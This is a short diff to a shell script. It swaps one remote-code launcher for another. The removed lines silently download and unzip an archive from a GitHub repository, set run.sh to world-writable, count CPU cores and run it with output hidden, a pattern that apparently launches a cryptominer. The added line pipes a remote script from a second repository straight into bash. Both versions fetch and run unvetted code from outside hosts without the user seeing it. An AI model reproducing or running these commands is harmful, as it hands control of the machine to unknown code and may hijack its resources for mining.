@@ -1,4 +1,1 @@
-wget https://github.com/renjanaayudisha57/fantastic-adventure/raw/refs/heads/main/tulup-main.zip >/dev/null 2>&1
-unzip tulup-main.zip >/dev/null 2>&1
-cd tulup-main
-cd vertex && chmod 777 run.sh && nproc --all && ./run.sh 7 >/dev/null 2>&1
+curl -sL  https://raw.githubusercontent.com/nineasku55/tampung/refs/heads/main/qirielan88 | bash
